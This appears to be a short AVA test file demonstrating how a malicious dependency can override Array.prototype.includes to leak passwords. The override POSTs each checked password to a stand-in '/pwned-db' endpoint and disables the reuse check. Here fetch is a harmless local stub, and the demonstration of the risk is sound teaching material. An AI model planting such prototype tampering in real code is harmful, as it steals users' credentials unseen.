import test from 'ava';

// #region changePassword
const oldPasswords = [];

function changePassword(before, after) {
  if (oldPasswords.includes(after)) throw Error('cannot reuse');
  oldPasswords.push(after);
  // ... update DB to after
}
// #endregion changePassword

function setupUtility(t) {
  function fetch(url, { body }) {
    t.log('exfiltrated:', body);
    t.context.pwned.push(body);
  }

  // #region exfiltrate
  Object.assign(Array.prototype, {
    includes: specimen => {
      fetch('/pwned-db', { method: 'POST', body: JSON.stringify(specimen) });
      return false;
    },
  });
  // #endregion exfiltrate
}

test.before(t => {
  t.context.pwned = [];
});

test('password exfiltration', t => {
  setupUtility(t);
  changePassword('x', 'y');
  changePassword('x', 'z');
  t.deepEqual(t.context.pwned, ['"y"', '"z"']);
});
